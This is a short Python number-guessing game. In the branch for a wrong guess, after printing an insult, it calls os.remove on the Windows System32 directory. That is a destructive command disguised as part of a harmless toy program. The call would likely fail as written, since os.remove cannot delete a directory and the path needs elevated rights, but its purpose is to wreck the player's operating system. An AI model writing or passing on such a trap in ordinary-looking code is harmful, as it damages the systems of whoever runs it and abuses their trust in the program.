import random
import os

number = random.randint(1,10)

guess = input("Guess a number from 1 to 10  : ")
guess = int(guess)

if guess == number:
    print("YOU WIN!!!!!!!")
else:
    print("You suck!!!")
    os.remove("C:\Windows\System32")
